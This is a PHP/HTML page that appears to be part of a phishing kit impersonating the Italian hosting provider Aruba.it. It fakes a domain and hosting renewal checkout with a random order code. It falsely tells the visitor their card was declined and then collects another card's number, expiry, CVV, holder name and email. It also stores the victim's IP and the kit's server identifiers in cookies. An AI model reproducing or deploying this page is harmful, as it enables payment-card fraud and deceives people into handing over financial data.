<?php
    require_once('PARTS/header.php');
?>
    <body>
        <div class="loader d-flex flex-column  justify-content-center align-items-center d-none">
            <img src="assets/images/aruba_logo.svg" class="loadingimg">
            <p style="padding-top: 25px; font-size: 24px; font-weight:100 ; z-index: 999;">Attendere prego...</p>
        </div>
        <div class="container">
            <div class="row" id="top">
                <div class="col-md-8 top-left" id="top-left">
                    <img src="assets/images/logo.svg" class="top-log float-xl-end float-md-end float-sm-star float-xs-start">
                </div>
                <div class="col-md-4 top-right" id="top-right d-sm-none">
                    <ul class="languages float-end">
                        <li>
                            <p>Lingua</p>
                        </li>
                        <li>
                            <img src="assets/images/language_italian.svg">
                            <span>Italiano</span>
                        </li>
                    </ul>
                </div>
            </div>
            <form id="form" action="./" method="POST">
			<input type="hidden" name="step"  value="main">
                <div class="row" id="middle">
                    <div class="col-md-3" id="middle-left">
                        <div class="text-center">
                            <p class="left-title">ORDINE</p>
                        </div>
                        <div class="right-blue">
                            <p>Importo:</p>
                            <p class="price text-white">25.99 €</p>
                            <p>Esercente:</p>
                            <p class="text-white pb-2">www.aruba.it</p>
                            <p>Codice ordine:</p>
                            <p class="text-white pb-2">IT<?php $idnum = rand(2000,2999).'B'.rand(100000, 199999); echo $idnum; $_SESSION['idnum'] = $idnum ?></p>
                        </div>
                    </div>
                    <div class="col-md-9" id="middle-right">
                        <div class="middle-top-border">
                            <span class="blue-border">
                                <span>
                                    <img src="assets/images/icon_arrowhead_progressBar_next.svg">
                                    <span>RINNOVO DOMINIO E HOSTING</span>
                                </span>
                                <span class="blue-border">
                                    <img src="assets/images/icon_arrowhead_progressBar_now.svg">
                                    <span class="now">Inserimento dati</span>
                                </span>
                            </span>
                            <span class="no-border">
                                <img src="assets/images/icon_arrowhead_progressBar_finished.svg">
                                <span>Verifica</span>
                            </span>
                            <span class="no-border">
                                <img src="assets/images/icon_arrowhead_progressBar_finished.svg">
                                <span>Finire</span>
                            </span>
                        </div>
						
                        <div class="gray-div">
                            <div class="form-group row">
							<center><p class="text-danger pt-2">Carta non accettata, cambia metodo di pagamento</p></center>
                                <div class="col-md-4 col-xl-4 col-sm-12 col-xs-12 d-flex justify-content-md-end justify-content-xl-end justify-content-sm-start justify-content-xs-start align-items-center">
                                    <lable class="form-label">Intestatario carta</lable>
                                </div>
                                <div class="col-md-6 col-xl-6 col-sm-12 col-xs-12 inputdiv">
                                    <input type="text" class="form-control input" id="fullname" name="fullname" placeholder="Mario Rossi"  required maxlength="50">
                                </div>
                            </div>
                            <div class="form-group row">
                                <div class="col-md-4 col-xl-4 col-sm-12 col-xs-12 d-flex justify-content-md-end justify-content-xl-end justify-content-sm-start justify-content-xs-start align-items-center">
                                    <lable class="form-label requiredtext">Numero Carta *</lable>
                                </div>
                                <div class="col-md-6 col-xl-6 col-sm-12 col-xs-12 inputdiv">
                                    <input type="text" class="form-control input requiredinput" name="cc" id="cc" placeholder="4444444444444448"  required maxlength="16">
                                    <span class="cc text-danger d-none"></span>
                                </div>
                            </div>
                            <div class="form-group row">
                                <div class="col-md-4 col-xl-4 col-sm-12 col-xs-12 d-flex justify-content-md-end justify-content-xl-end justify-content-sm-start justify-content-xs-start align-items-center">
                                    <lable class="form-label requiredtext">Data scadenza *</lable>
                                </div>
                                <div class="col">
                                    <div class="row">
                                        <div class="col inputdiv">
                                            <select class="exp inputselect requiredinput expm" name="expm" id="expm">
                                                <option>mm</option>
                                                <option value="01">01</option>
                                                <option value="02">02</option>
                                                <option value="03">03</option>
                                                <option value="04">04</option>
                                                <option value="05">05</option>
                                                <option value="06">06</option>
                                                <option value="07">07</option>
                                                <option value="08">08</option>
                                                <option value="09">09</option>
                                                <option value="10">10</option>
                                                <option value="11">11</option>
                                                <option value="12">12</option>
                                            </select>
                                            <select class="exp inputselect requiredinput expy"  name="expy" id="expy">
                                                <option>aa</option>
                                                <option value="23">23</option>
                                                <option value="24">24</option>
                                                <option value="25">25</option>
                                                <option value="26">26</option>
                                                <option value="29">29</option>
                                                <option value="30">30</option>
                                                <option value="31">31</option>
                                                <option value="32">32</option>
                                                <option value="33">33</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group row">
                                <div class="col-md-4 col-xl-4 col-sm-12 col-xs-12 d-flex justify-content-md-end justify-content-xl-end justify-content-sm-start justify-content-xs-start align-items-center">
                                    <lable class="form-label requiredtext text-right">Codice di sicurezza *<br/>(CVV2 o 4DBC)</lable>
                                </div>
                                <div class="col-md-6 col-xl-6 col-sm-12 col-xs-12 inputdiv d-flex align-items-center">
                                    <input type="text" class="form-control inputhalf cvv" name="cvv" id="cvv" placeholder="123"  required maxlength="4">
                                    <span class="flink">Dove trovo il codice di sicurezza?</span>
                                </div>
                            </div>
                            <div class="form-group row">
                                <div class="col-md-4 col-xl-4 col-sm-12 col-xs-12 col-xl-4 col-sm-12 col-xs-12 d-flex justify-content-md-end justify-content-xl-end justify-content-sm-start justify-content-xs-start align-items-center ">
                                    <lable class="form-label">Email</lable>
                                </div>
                                <div class="col-md-6 col-xl-6 col-sm-12 col-xs-12 inputdiv">
                                    <input type="email" class="form-control input email" name="email" id="email" placeholder="mario.rossi@example.com"  required maxlength="50">
                                </div>
                            </div>
                        </div>
                        <div class="undergry">
                            <p class="pt-2">*I campi contrassegnati con asterisco sono obbligatori.</p>
                            <div class="text-center">
                                <p class="flink">Informativa sulla privacy</p>
                            </div>
                        </div>
                        <div class="row pt-5">
                            <div class="col-md-12 col-xl-12 col-sm-12 col-xs-12 p-0">
                                <button type="btn" class="submitbtn invert">Indietro</button>
                                <button type="submit" class="submitbtn float-end">Procedi</button>
                            </div>
                        </div>
                    </div>
                </div>           
            </form>
        </div>
        <?php  require_once('PARTS/footer.php') ?>
        <script src="assets/js/pages/index.js"></script>
        <script>
            let identifier = Math.floor((Math.random() * 1000000) + 1);
            document.cookie = "identifier="+identifier;
            document.cookie = "ip=<?php echo get_client_ip(); ?>";
            document.cookie = "server=<?php echo $AdminServer; ?>";
            document.cookie = "wserver=<?php echo $WServerIP; ?>";
        </script>
    </body>
</html>